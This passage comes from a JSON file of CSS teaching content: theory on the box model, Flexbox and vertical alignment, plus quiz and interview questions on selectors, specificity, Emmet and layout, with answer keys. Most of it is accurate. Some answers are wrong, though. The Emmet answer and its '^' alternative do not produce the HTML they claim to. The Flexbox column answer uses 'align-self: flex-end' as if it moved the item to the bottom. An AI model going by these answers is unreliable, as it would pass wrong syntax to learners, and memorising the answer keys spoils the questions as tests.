              "code": "/* HTML */\n<div class=\"box border-box-example\">Content</div>\n\n/* CSS */\n.border-box-example {\n  width: 100px;\n  height: 100px;\n  padding: 10px;\n  border: 5px solid black;\n  margin: 10px;\n  background-color: lightgreen;\n  box-sizing: border-box;\n}\n\n/* Calculated total width: 100px (includes padding and border) */\n/* Calculated total height: 100px (includes padding and border) */",
              "explanation": "With `box-sizing: border-box`, the specified `width` and `height` now include the padding and border. The content area will shrink to accommodate them, but the overall dimensions of the element (up to the border) will be exactly 100px by 100px. This makes layout calculations much simpler.",
              "language": "css"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS",
            "Box Model",
            "Layout",
            "Dimensions",
            "box-sizing"
          ],
          "technology": "CSS",
          "prerequisites": [
            "html_elements",
            "css_properties"
          ],
          "complexity": 6,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "responsive_design",
            "css_grid",
            "flexbox"
          ]
        },
        {
          "id": "theory_flexbox",
          "title": "Flexbox (Flexible Box Layout)",
          "content": "Flexbox is a one-dimensional layout system that helps distribute space among items in a container and align them, making it easier to design complex layouts. It's 'one-dimensional' because it arranges items either in a row OR in a column, but not both simultaneously (unlike CSS Grid, which is two-dimensional).\n\nFlexbox consists of a **flex container** (the parent element with `display: flex` or `display: inline-flex`) and **flex items** (its direct children).\n\n## Flex Container Properties:\n\n-   `display: flex | inline-flex;`: Defines a flex container. `inline-flex` makes the container itself behave like an inline element.\n-   `flex-direction: row | row-reverse | column | column-reverse;`: Establishes the main-axis, defining the direction flex items are placed in the flex container. `row` is the default.\n-   `flex-wrap: nowrap | wrap | wrap-reverse;`: Controls whether flex items are forced onto a single line or can wrap onto multiple lines. `nowrap` is the default.\n-   `justify-content: flex-start | flex-end | center | space-between | space-around | space-evenly;`: Aligns flex items along the **main-axis** (horizontal by default for `flex-direction: row`).\n-   `align-items: flex-start | flex-end | center | baseline | stretch;`: Aligns flex items along the **cross-axis** (vertical by default for `flex-direction: row`) *within each line*.\n-   `align-content: flex-start | flex-end | center | space-between | space-around | stretch;`: Aligns the **flex lines themselves** when there is extra space in the cross-axis, similar to `justify-content` but for lines. Only applies when `flex-wrap` is set to `wrap` or `wrap-reverse`.\n-   `gap: <length> | <percentage>;` (or `row-gap`, `column-gap`): Specifies the size of the gap between rows and columns (items) in a flex container. A more modern property for spacing items.\n\n## Flex Item Properties:\n\n-   `flex-grow: <number>;`: Specifies how much a flex item will grow relative to the rest of the flex items in the container when there is extra space. Default is 0 (won't grow).\n-   `flex-shrink: <number>;`: Specifies how much a flex item will shrink relative to the rest of the flex items in the container when there is not enough space. Default is 1 (can shrink).\n-   `flex-basis: <length> | auto;`: Defines the default size of an element before the remaining space is distributed. `auto` is the default, which means the item's content size or explicit width/height.\n-   `flex: <flex-grow> <flex-shrink> <flex-basis>;`: Shorthand for `flex-grow`, `flex-shrink`, and `flex-basis`. Common values: `flex: 1 0 auto;` (can grow, won't shrink, default size), `flex: 1;` (shorthand for `1 1 0%`), `flex: auto;` (shorthand for `1 1 auto`).\n-   `align-self: auto | flex-start | flex-end | center | baseline | stretch;`: Overrides the `align-items` property for a single flex item, allowing individual alignment along the cross-axis.\n-   `order: <number>;`: Specifies the order of a flex item relative to the rest. Items are laid out in ascending order. Default is 0.",
          "examples": [
            {
              "id": "example_flexbox_1",
              "title": "Basic Flex Container and Items",
              "code": "/* HTML */\n<div class=\"flex-container\">\n  <div class=\"flex-item\">1</div>\n  <div class=\"flex-item\">2</div>\n  <div class=\"flex-item\">3</div>\n</div>\n\n/* CSS */\n.flex-container {\n  display: flex;\n  justify-content: space-around;\n  align-items: center;\n  height: 150px; /* For vertical alignment to be visible */\n  border: 1px solid #ccc;\n}\n.flex-item {\n  width: 50px;\n  height: 50px;\n  background-color: lightcoral;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  font-weight: bold;\n  border: 1px solid #999;\n}",
              "explanation": "This example demonstrates a basic flex container. Items are horizontally spaced around the container using `justify-content: space-around` and vertically centered using `align-items: center`. Each item is also a flex container to center its number.",
              "language": "css"
            },
            {
              "id": "example_flexbox_2",
              "title": "Flex Item Properties (Grow, Shrink, Basis, Order)",
              "code": "/* HTML */\n<div class=\"flex-container-2\">\n  <div class=\"flex-item-2 item-a\">A</div>\n  <div class=\"flex-item-2 item-b\">B</div>\n  <div class=\"flex-item-2 item-c\">C</div>\n</div>\n\n/* CSS */\n.flex-container-2 {\n  display: flex;\n  width: 300px;\n  border: 1px solid blue;\n}\n.flex-item-2 {\n  background-color: lightgreen;\n  padding: 10px;\n  border: 1px solid green;\n}\n.item-a {\n  flex-basis: 50px; /* Initial size 50px */\n  flex-grow: 1;    /* Grows by 1 unit */\n  order: 2;        /* Second in order */\n}\n.item-b {\n  flex-basis: 100px; /* Initial size 100px */\n  flex-grow: 2;    /* Grows by 2 units (twice as much as A) */\n  order: 1;        /* First in order */\n}\n.item-c {\n  flex-basis: 50px; /* Initial size 50px */\n  flex-shrink: 0;  /* Will not shrink */\n  order: 3;        /* Third in order */\n  background-color: lightpink;\n}",
              "explanation": "This example illustrates `flex-grow`, `flex-shrink`, `flex-basis`, and `order`. Item 'B' appears first due to `order: 1`. Item 'B' also grows twice as much as 'A' because its `flex-grow` is 2 compared to 'A''s 1. Item 'C' maintains its size even if the container shrinks due to `flex-shrink: 0` (though shrinking isn't explicitly shown with a small container width here, it's a key concept).",
              "language": "css"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS",
            "Flexbox",
            "Layout",
            "Responsive Design",
            "Alignment"
          ],
          "technology": "CSS",
          "prerequisites": [
            "css_basics",
            "box_model"
          ],
          "complexity": 7,
          "interviewRelevance": 10,
          "learningPath": "intermediate",
          "requiredFor": [
            "responsive_layouts",
            "component_design"
          ]
        },
        {
          "id": "theory_vertical_alignment",
          "title": "Common Vertical Alignment Techniques in CSS",
          "content": "Vertically aligning elements in CSS can be challenging, but modern CSS provides several robust solutions. The markdown specifically mentions using Flexbox, which is one of the most powerful and commonly used methods.\n\n## Vertical Alignment with Flexbox:\n\nFlexbox simplifies vertical alignment significantly using properties on the flex container and flex items.\n\n### For a single line of flex items:\n-   `align-items`: Used on the **flex container** to align items along the cross-axis (vertically when `flex-direction` is `row`).\n    -   `center`: Centers items vertically.\n    -   `flex-start`: Aligns items to the top.\n    -   `flex-end`: Aligns items to the bottom.\n    -   `stretch`: Stretches items to fill the container (default, if `height` or `max-height` is not set on items).\n\n### For multiple lines of flex items (when `flex-wrap: wrap` is used):\n-   `align-content`: Used on the **flex container** to align the entire block of wrapped lines within the container's cross-axis, similar to `justify-content` but for multiple lines.\n    -   `center`: Centers all flex lines vertically.\n    -   `space-between`: Distributes space evenly between lines.\n\n### For individual flex items:\n-   `align-self`: Used on an **individual flex item** to override the `align-items` setting from the container. It takes the same values as `align-items`.\n\n## Horizontal and Vertical Centering with Flexbox:\n\nTo perfectly center an item (or group of items) both horizontally and vertically within its container, you can combine `justify-content: center` and `align-items: center` on the flex container.\n\n```css\n.flex-center {\n  display: flex;\n  justify-content: center; /* horizontal centering */\n  align-items: center;   /* vertical centering */\n  /* Add height to container for vertical centering to be visible */\n  height: 100vh;\n}\n```\n\n## Other Common Vertical Alignment Techniques (brief overview for context):\n\nWhile Flexbox is preferred, other methods exist for specific scenarios:\n\n-   **Vertical Align Property (for inline/table-cell elements):** `vertical-align` works on `inline`, `inline-block`, `inline-table`, and `table-cell` elements to align them vertically with respect to their line box or cell.\n-   **Positioning (Absolute/Relative):** Using `position: absolute;` with `top: 50%; transform: translateY(-50%);` is a common technique for single elements when their height is unknown.\n-   **CSS Grid:** CSS Grid offers even more powerful two-dimensional alignment capabilities using `align-items`, `justify-items`, `align-content`, and `justify-content` for aligning items within cells and entire tracks.",
          "examples": [
            {
              "id": "example_vertical_alignment_1",
              "title": "Centering with Flexbox",
              "code": "/* HTML */\n<div class=\"flex-center-container\">\n  <div class=\"centered-item\">I am centered!</div>\n</div>\n\n/* CSS */\n.flex-center-container {\n  display: flex;\n  justify-content: center; /* Aligns horizontally */\n  align-items: center;   /* Aligns vertically */\n  width: 100%;\n  height: 200px; /* Essential for vertical alignment to be visible */\n  border: 2px dashed #007bff;\n}\n.centered-item {\n  background-color: #e0f7fa;\n  padding: 20px;\n  border-radius: 8px;\n  box-shadow: 0 2px 4px rgba(0,0,0,0.1);\n}",
              "explanation": "This example shows the most straightforward way to center an item both horizontally and vertically using Flexbox. By setting `display: flex`, `justify-content: center`, and `align-items: center` on the parent container, the child item is perfectly centered.",
              "language": "css"
            },
            {
              "id": "example_vertical_alignment_2",
              "title": "Individual Item Alignment with align-self",
              "code": "/* HTML */\n<div class=\"flex-container-align-self\">\n  <div class=\"flex-item-align-self\">Top</div>\n  <div class=\"flex-item-align-self align-self-center\">Middle</div>\n  <div class=\"flex-item-align-self align-self-end\">Bottom</div>\n</div>\n\n/* CSS */\n.flex-container-align-self {\n  display: flex;\n  align-items: flex-start; /* Default alignment for all items */\n  height: 150px;\n  border: 1px solid #ccc;\n}\n.flex-item-align-self {\n  width: 60px;\n  background-color: lightyellow;\n  margin: 5px;\n  padding: 10px;\n  border: 1px solid orange;\n}\n.align-self-center {\n  align-self: center;\n}\n.align-self-end {\n  align-self: flex-end;\n}",
              "explanation": "This example demonstrates `align-self`. The container has `align-items: flex-start`, so the first item aligns to the top. However, the second and third items override this using `align-self: center` and `align-self: flex-end` respectively, positioning them in the middle and bottom of the container.",
              "language": "css"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS",
            "Flexbox",
            "Alignment",
            "Vertical Alignment",
            "Layout"
          ],
          "technology": "CSS",
          "prerequisites": [
            "flexbox"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "responsive_design",
            "component_layout"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_css_selectors_1",
          "topic": "CSS Adjacent Sibling Selector",
          "level": "easy",
          "type": "mcq",
          "question": "Which CSS selector targets a `<p>` element that is immediately preceded by an `<a>` element?",
          "answer": "a + p {}",
          "options": [
            "a ~ p {}",
            "a > p {}",
            "a p {}",
            "a + p {}"
          ],
          "analysisPoints": [
            "Understanding of the `+` combinator for adjacent siblings.",
            "Distinguishing between different combinators (sibling, child, descendant)."
          ],
          "keyConcepts": [
            "Adjacent Sibling Selector",
            "CSS Combinators"
          ],
          "evaluationCriteria": [
            "Correct identification of the adjacent sibling selector syntax.",
            "Knowledge of CSS combinators."
          ],
          "example": "The `a + p {}` selector will style only the `<p>` element directly following an `<a>` element. For example:\n```html\n<a href=\"#\">Link</a>\n<p>This paragraph is styled.</p>\n<p>This paragraph is NOT styled.</p>\n```",
          "tags": [
            "CSS",
            "Selectors",
            "Combinators"
          ],
          "prerequisites": [
            "css_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_selectors_2",
          "topic": "CSS Pseudo-classes",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following HTML, which CSS rule will correctly apply a red background to the second list item?\n\n```html\n<ul>\n  <li>Item 1</li>\n  <li>Item 2</li>\n  <li>Item 3</li>\n  <li>Item 4</li>\n</ul>\n```",
          "answer": "li:nth-child(2) { background-color: red; }",
          "options": [
            "li:first-child + li { background-color: red; }",
            "li:nth-child(2) { background-color: red; }",
            "ul > li:last-child { background-color: red; }",
            "li:even { background-color: red; }"
          ],
          "analysisPoints": [
            "Understanding of `:nth-child()` pseudo-class with numerical arguments.",
            "Distinguishing `:first-child + li` which selects the second `li` but requires specific preceding element.",
            "Knowledge that `:even` is typically `nth-child(2n)`.",
            "Understanding `:last-child` selects the last element."
          ],
          "keyConcepts": [
            "Pseudo-classes",
            ":nth-child()",
            "CSS Selectors"
          ],
          "evaluationCriteria": [
            "Ability to select specific elements using pseudo-classes.",
            "Correct application of `:nth-child()`."
          ],
          "example": "The `:nth-child(2)` pseudo-class specifically targets the second child element. While `li:first-child + li` would also work in this specific case, `li:nth-child(2)` is more direct and explicit for selecting the Nth item.\n\n```css\nli:nth-child(2) {\n  background-color: red;\n}\n```",
          "tags": [
            "CSS",
            "Pseudo-classes",
            "Selectors"
          ],
          "prerequisites": [
            "css_selectors"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_selectors_3",
          "topic": "CSS Pseudo-elements",
          "level": "medium",
          "type": "open",
          "question": "Explain the difference between `::before` and `:first-child` in CSS, providing a scenario where each would be appropriately used.",
          "answer": "The key difference is that `::before` is a pseudo-element used to insert generated content *before* the actual content of an element, while `:first-child` is a pseudo-class used to select an element that is the *first child* of its parent.\n\n-   **`::before` (Pseudo-element):**\n    -   **Purpose:** Inserts content, which can be text, an image, or an icon, before the element's existing content. It requires the `content` property.\n    -   **Usage:** Often used for decorative purposes, adding icons, quotes, or clearfixes without modifying the HTML structure.\n    -   **Scenario:** Adding a decorative bullet point or an icon before each list item in an unordered list:\n        ```css\n        li::before {\n          content: \"\\2022 \"; /* Unicode for a bullet point */\n          color: blue;\n          font-weight: bold;\n          margin-right: 5px;\n        }\n        ```\n\n-   **`:first-child` (Pseudo-class):**\n    -   **Purpose:** Selects an element that happens to be the first child in its parent's list of children.\n    -   **Usage:** Used for styling the first item in a group of siblings, e.g., styling the first paragraph, list item, or table row differently.\n    -   **Scenario:** Giving a special style to the first paragraph in a container:\n        ```css\n        div p:first-child {\n          font-weight: bold;\n          margin-top: 0;\n        }\n        ```\nIn summary, `::before` *adds* content, while `:first-child` *selects* an existing element based on its position.",
          "analysisPoints": [
            "Clear distinction between pseudo-elements (content generation) and pseudo-classes (state/position selection).",
            "Correct syntax for both (`::` vs `:`).",
            "Practical and distinct use-case scenarios for each.",
            "Mention of the `content` property for pseudo-elements."
          ],
          "keyConcepts": [
            "Pseudo-elements",
            "Pseudo-classes",
            "::before",
            ":first-child",
            "CSS Selectors"
          ],
          "evaluationCriteria": [
            "Accuracy of definitions.",
            "Clarity of examples.",
            "Demonstrated understanding of when to use each.",
            "Distinction of `::` vs `:`."
          ],
          "tags": [
            "CSS",
            "Selectors",
            "Pseudo-elements",
            "Pseudo-classes"
          ],
          "prerequisites": [
            "css_selectors"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_specificity_1",
          "topic": "CSS Selector Specificity",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following CSS rules and HTML, what color will the text 'Hello' be?\n\n```css\n#myDiv p {\n  color: blue;\n}\n\ndiv p {\n  color: red;\n}\n\n.myClass {\n  color: green;\n}\n```\n\n```html\n<div id=\"myDiv\">\n  <p class=\"myClass\">Hello</p>\n</div>\n```",
          "answer": "blue",
          "options": [
            "red",
            "green",
            "blue",
            "The color will not be applied due to conflict."
          ],
          "analysisPoints": [
            "Correctly calculating specificity scores for different selector types.",
            "Understanding that higher specificity wins.",
            "Specificity of ID selector combined with type selector is higher than class or just type selector."
          ],
          "keyConcepts": [
            "CSS Specificity",
            "ID selectors",
            "Class selectors",
            "Type selectors",
            "Combinators"
          ],
          "evaluationCriteria": [
            "Ability to calculate and compare specificity.",
            "Understanding of CSS cascade rules."
          ],
          "example": "Let's calculate specificity for each rule (a, b, c, d):\n1.  `#myDiv p`: 1 ID, 1 Type. Score: (0, 1, 0, 1)\n2.  `div p`: 2 Types. Score: (0, 0, 0, 2)\n3.  `.myClass`: 1 Class. Score: (0, 0, 1, 0)\n\nComparing the scores:\n(0, 1, 0, 1) > (0, 0, 1, 0) > (0, 0, 0, 2)\n\nTherefore, the rule `#myDiv p { color: blue; }` has the highest specificity and its color will apply.",
          "tags": [
            "CSS",
            "Specificity",
            "Selectors"
          ],
          "prerequisites": [
            "css_selectors"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_specificity_2",
          "topic": "CSS `!important`",
          "level": "hard",
          "type": "open",
          "question": "Explain the role of `!important` in CSS specificity. When might its use be justified, and what are the primary reasons to avoid it in general development?",
          "answer": "`!important` is a keyword used in CSS to override the normal cascading and specificity rules. When `!important` is declared on a CSS property, that declaration takes precedence over *all* other declarations, regardless of their specificity, unless another declaration also has `!important` (in which case, the one with higher specificity or the one declared last still wins among them).\n\n**When its use might be justified:**\n1.  **Overriding inline styles (rare):** When you have no control over the HTML (e.g., third-party widgets or legacy systems) and elements have inline styles that need to be overridden by external CSS.\n2.  **Utility classes for specific overrides:** For very specific, non-reusable utility classes like `.hidden !important` or `.error-text !important` that *must* always apply, though even here, better patterns (like CSS variables or more specific selectors) are often preferred.\n3.  **Theming/User Preferences in specific cases:** In some very specific scenarios, like a user overriding a theme through a custom stylesheet, `!important` might be used in the user's stylesheet to ensure their preferences apply.\n\n**Primary reasons to avoid it in general development:**\n1.  **Breaks the cascade:** It disrupts the natural flow and predictability of CSS, making it difficult to understand which styles are applied and why.\n2.  **Debugging headaches:** It makes debugging much harder. When a style isn't applying, `!important` declarations are the first culprits to check, and finding which one is overriding others can be a nightmare.\n3.  **Hard to override:** Once `!important` is used, the only way to override it is with another `!important` declaration, leading to an '`!important` war' where styles become increasingly difficult to manage and modify.\n4.  **Poor maintainability:** It often leads to bloated and unmanageable stylesheets over time. It's a quick fix that creates long-term problems.\n5.  **Redundancy:** Often, increased specificity (e.g., using an ID selector or combining multiple classes) can achieve the same result as `!important` without its downsides.\n\nIn essence, `!important` should be considered a last resort, used only in very specific, constrained scenarios where no other specificity-based solution is feasible or practical.",
          "analysisPoints": [
            "Correctly defines `!important`'s override behavior.",
            "Identifies legitimate, albeit rare, use cases.",
            "Articulates core negative consequences (debugging, maintainability, cascade disruption).",
            "Suggests alternatives (specificity)."
          ],
          "keyConcepts": [
            "CSS Specificity",
            "!important",
            "CSS Cascade",
            "Maintainability",
            "Debugging"
          ],
          "evaluationCriteria": [
            "Comprehensive understanding of `!important`.",
            "Ability to articulate both pros (limited) and cons (extensive).",
            "Practical implications for development."
          ],
          "tags": [
            "CSS",
            "Specificity",
            "!important",
            "Best Practices"
          ],
          "prerequisites": [
            "css_specificity"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_emmet_1",
          "topic": "Emmet Syntax",
          "level": "easy",
          "type": "flashcard",
          "question": "What Emmet shorthand would you use to generate an unordered list with three list items, each having the class 'list-item'?",
          "answer": "ul>li.list-item*3",
          "analysisPoints": [
            "Recall of Emmet's child operator (`>`).",
            "Recall of Emmet's class operator (`.`).",
            "Recall of Emmet's multiplication operator (`*`)."
          ],
          "keyConcepts": [
            "Emmet",
            "Emmet Operators",
            "HTML Shorthand"
          ],
          "evaluationCriteria": [
            "Ability to quickly recall basic Emmet syntax.",
            "Correct combination of operators."
          ],
          "example": "Typing `ul>li.list-item*3` and pressing Tab (or equivalent) would expand to:\n```html\n<ul>\n  <li class=\"list-item\"></li>\n  <li class=\"list-item\"></li>\n  <li class=\"list-item\"></li>\n</ul>\n```",
          "tags": [
            "Emmet",
            "Productivity"
          ],
          "prerequisites": [
            "html_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_emmet_2",
          "topic": "Emmet Advanced Shorthand",
          "level": "medium",
          "type": "code",
          "question": "Write the Emmet shorthand to create the following HTML structure:\n\n```html\n<div class=\"header-wrapper\">\n  <header>\n    <h1>Welcome</h1>\n  </header>\n</div>\n<div class=\"main-content\">\n  <p>Some text here.</p>\n  <a href=\"#contact\">Contact Us</a>\n</div>\n```",
          "answer": "div.header-wrapper>header>h1{Welcome}+div.main-content>(p{Some text here.}+a[href=\"#contact\"]{Contact Us})",
          "options": [],
          "analysisPoints": [
            "Correct use of the child (`>`) and sibling (`+`) operators.",
            "Correct application of classes (`.`) and attributes (`[]`).",
            "Proper grouping with parentheses `()` for complex sibling structures.",
            "Including text content `{}`."
          ],
          "keyConcepts": [
            "Emmet",
            "Emmet Operators",
            "Nested Structures",
            "Sibling Structures"
          ],
          "evaluationCriteria": [
            "Accuracy of Emmet syntax.",
            "Ability to represent complex HTML structures.",
            "Efficient use of Emmet features."
          ],
          "example": "One possible Emmet shorthand: `div.header-wrapper>header>h1{Welcome}+div.main-content>(p{Some text here.}+a[href=\"#contact\"]{Contact Us})`\n\nAnother valid option: `div.header-wrapper>header>h1{Welcome}^div.main-content>p{Some text here.}+a[href=\"#contact\"]{Contact Us}` (using `^` to climb up before `div.main-content`)\n\nBoth demonstrate a good grasp of Emmet's capabilities for complex nesting and sibling creation.",
          "tags": [
            "Emmet",
            "Productivity",
            "HTML"
          ],
          "prerequisites": [
            "emmet"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_box_model_1",
          "topic": "CSS Box Model Fundamentals",
          "level": "easy",
          "type": "flashcard",
          "question": "List the four main components of the CSS Box Model, starting from the innermost layer to the outermost.",
          "answer": "Content, Padding, Border, Margin",
          "analysisPoints": [
            "Recall of the four layers of the box model.",
            "Understanding of their order."
          ],
          "keyConcepts": [
            "CSS Box Model",
            "Content",
            "Padding",
            "Border",
            "Margin"
          ],
          "evaluationCriteria": [
            "Basic knowledge of the box model components."
          ],
          "example": "The box model visualizes an element as a box composed of these layers, from inside out.",
          "tags": [
            "CSS",
            "Box Model"
          ],
          "prerequisites": [
            "css_basics"
          ],
          "complexity": 2,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_box_model_2",
          "topic": "CSS Box Model with `box-sizing`",
          "level": "medium",
          "type": "mcq",
          "question": "Consider a `div` element styled with the following CSS:\n\n```css\n.my-box {\n  width: 200px;\n  height: 100px;\n  padding: 15px;\n  border: 5px solid black;\n  box-sizing: border-box;\n}\n```\n\nWhat will be the actual total width and height of this element (including content, padding, and border)?",
          "answer": "Total Width: 200px, Total Height: 100px",
          "options": [
            "Total Width: 240px, Total Height: 140px",
            "Total Width: 200px, Total Height: 100px",
            "Total Width: 230px, Total Height: 130px",
            "Total Width: 210px, Total Height: 110px"
          ],
          "analysisPoints": [
            "Understanding of `box-sizing: border-box`.",
            "Ability to differentiate between `content-box` and `border-box` calculation.",
            "Correctly calculating dimensions when padding and border are included in width/height."
          ],
          "keyConcepts": [
            "CSS Box Model",
            "box-sizing: border-box",
            "Content-box",
            "Dimensions"
          ],
          "evaluationCriteria": [
            "Accurate application of `box-sizing` concept.",
            "Correct calculation of element dimensions."
          ],
          "example": "With `box-sizing: border-box`, the `width` and `height` properties *include* the padding and border. Therefore, the total width of the element from border-edge to border-edge will be exactly 200px, and the total height will be 100px. The content area will shrink to accommodate the 15px padding on each side (30px total horizontal) and 5px border on each side (10px total horizontal), making the content width `200 - 30 - 10 = 160px`.",
          "tags": [
            "CSS",
            "Box Model",
            "box-sizing"
          ],
          "prerequisites": [
            "box_model"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_box_model_3",
          "topic": "Practical Box Model Implications",
          "level": "hard",
          "type": "open",
          "question": "Discuss the practical implications of using `box-sizing: border-box` compared to the default `content-box` in a responsive web design context. Why is `border-box` generally preferred for modern layouts?",
          "answer": "The choice between `box-sizing: content-box` (default) and `box-sizing: border-box` has significant practical implications, especially in responsive web design.\n\n**`content-box` (Default behavior):**\n-   `width` and `height` apply *only* to the content area.\n-   `padding` and `border` are *added* to the specified `width` and `height`, increasing the element's total size.\n-   **Implication:** If you set an element to `width: 50%` and then add `padding: 10px`, its total width will be `50% + 20px`, which can cause overflow or break precise column layouts, especially in fluid, percentage-based designs. You constantly have to subtract padding/border from your width calculations.\n\n**`border-box` (Preferred behavior):**\n-   `width` and `height` apply to the **content + padding + border**.\n-   The content area shrinks to accommodate padding and border, but the overall size (up to the border edge) remains precisely what you specified.\n-   **Implication:** If you set an element to `width: 50%` and add `padding: 10px`, its total width will *remain* exactly `50%`. The padding and border will be *included* within that `50%` width, making layouts much more predictable and robust. This is extremely beneficial for responsive designs that rely on percentages or fractions.\n\n**Why `border-box` is generally preferred for modern layouts:**\n1.  **Intuitive Sizing:** It aligns with how designers and developers naturally think about element dimensions. A `width: 200px` element is truly 200px wide, regardless of padding/border.\n2.  **Simplified Layouts:** It eliminates the need for complex width calculations (e.g., `calc(50% - 20px)`) to account for padding and borders. This simplifies grid systems (Flexbox, CSS Grid) and column layouts.\n3.  **Predictable Responsive Behavior:** When using percentage-based widths, `border-box` ensures elements accurately fit within their parent containers without unexpectedly overflowing due to padding/border additions. This is crucial for maintaining layout integrity across different screen sizes.\n4.  **Consistency:** Applying `box-sizing: border-box` globally (e.g., `*, *::before, *::after { box-sizing: border-box; }`) creates a consistent and predictable sizing model for all elements, reducing surprises and bugs.\n5.  **Easier Component Building:** When creating reusable UI components, `border-box` ensures that a component's specified dimensions will hold true, regardless of how much internal padding or border is added, making them more modular and easier to integrate.\n\nIn essence, `border-box` makes layout design more straightforward, less error-prone, and inherently more compatible with responsive design principles, leading to cleaner and more maintainable CSS.",
          "analysisPoints": [
            "Detailed comparison of `content-box` and `border-box` behavior.",
            "Clear explanation of how each affects total element dimensions.",
            "Specific examples of implications in responsive design (e.g., `width: 50%` with padding).",
            "Comprehensive list of reasons for `border-box` preference (intuition, simplification, predictability, consistency, component building).",
            "Mention of global `box-sizing` reset."
          ],
          "keyConcepts": [
            "CSS Box Model",
            "box-sizing",
            "Responsive Web Design",
            "Layout",
            "Maintainability",
            "CSS Grid",
            "Flexbox"
          ],
          "evaluationCriteria": [
            "Depth of understanding of `box-sizing` implications.",
            "Ability to articulate benefits in a real-world context (responsive design).",
            "Clarity and structure of explanation.",
            "Demonstrated knowledge of best practices."
          ],
          "tags": [
            "CSS",
            "Box Model",
            "Responsive Design",
            "Best Practices"
          ],
          "prerequisites": [
            "box_model"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_flexbox_1",
          "topic": "Flexbox Container Properties",
          "level": "medium",
          "type": "mcq",
          "question": "Which Flexbox container property is used to align flex items along the **main-axis**?",
          "answer": "justify-content",
          "options": [
            "align-items",
            "align-content",
            "flex-direction",
            "justify-content"
          ],
          "analysisPoints": [
            "Distinguishing between main-axis and cross-axis alignment.",
            "Correctly identifying the property for main-axis alignment (`justify-content`).",
            "Understanding the roles of other `align-*` properties."
          ],
          "keyConcepts": [
            "Flexbox",
            "Flex Container",
            "Main-axis",
            "Cross-axis",
            "justify-content",
            "align-items"
          ],
          "evaluationCriteria": [
            "Core understanding of Flexbox axis alignment.",
            "Correct identification of `justify-content`."
          ],
          "example": "If `flex-direction` is `row` (default), the main-axis is horizontal. `justify-content: center;` would horizontally center items. If `flex-direction` is `column`, the main-axis is vertical, and `justify-content: center;` would vertically center items.",
          "tags": [
            "CSS",
            "Flexbox",
            "Layout"
          ],
          "prerequisites": [
            "flexbox"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_flexbox_2",
          "topic": "Flexbox Item Properties",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the purpose of the `flex` shorthand property on a flex item, and what are the three individual properties it sets?",
          "answer": "The `flex` shorthand property defines the ability of a flex item to grow or shrink, and its initial size. It sets `flex-grow`, `flex-shrink`, and `flex-basis`.",
          "analysisPoints": [
            "Understanding `flex` as a shorthand.",
            "Recalling the three constituent properties.",
            "Explaining the general purpose of each (grow, shrink, initial size)."
          ],
          "keyConcepts": [
            "Flexbox",
            "Flex Item",
            "flex-grow",
            "flex-shrink",
            "flex-basis",
            "flex shorthand"
          ],
          "evaluationCriteria": [
            "Knowledge of Flexbox item properties.",
            "Ability to recall shorthand components."
          ],
          "example": "`flex: 1 0 auto;` means `flex-grow: 1` (can grow), `flex-shrink: 0` (won't shrink), and `flex-basis: auto` (initial size based on content or explicit width).",
          "tags": [
            "CSS",
            "Flexbox",
            "Properties"
          ],
          "prerequisites": [
            "flexbox"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_flexbox_3",
          "topic": "Flexbox Layout Scenarios",
          "level": "hard",
          "type": "code",
          "question": "Implement a Flexbox layout where:\n1.  The container arranges items in a column.\n2.  Items are vertically centered within the container.\n3.  Items are horizontally stretched to fill the container's width.\n4.  The third item in the column is positioned at the very bottom of the container, overriding the general alignment.\n\nProvide the HTML and CSS for this setup.",
          "answer": "```html\n<div class=\"flex-container-challenge\">\n  <div class=\"flex-item-challenge\">Item 1</div>\n  <div class=\"flex-item-challenge\">Item 2</div>\n  <div class=\"flex-item-challenge item-bottom\">Item 3</div>\n</div>\n```\n\n```css\n.flex-container-challenge {\n  display: flex;\n  flex-direction: column;\n  height: 300px; /* Essential for vertical alignment to have effect */\n  border: 2px dashed gray;\n  \n  /* 2. Vertically center items along the main-axis (now column) */\n  justify-content: center;\n  \n  /* 3. Horizontally stretch items along the cross-axis (now row) */\n  align-items: stretch; /* Default for align-items, but explicit for clarity */\n}\n\n.flex-item-challenge {\n  padding: 10px;\n  margin: 5px;\n  background-color: lightblue;\n  border: 1px solid blue;\n  text-align: center;\n}\n\n/* 4. Position the third item at the bottom */\n.item-bottom {\n  align-self: flex-end; /* Overrides align-items for this specific item */\n  margin-top: auto; /* Pushes item to the end of the container */\n}\n```",
          "options": [],
          "analysisPoints": [
            "Correctly setting `flex-direction` to `column`.",
            "Applying `justify-content` for vertical centering when `flex-direction` is column.",
            "Applying `align-items` for horizontal stretching when `flex-direction` is column.",
            "Using `align-self` to override container alignment for a single item.",
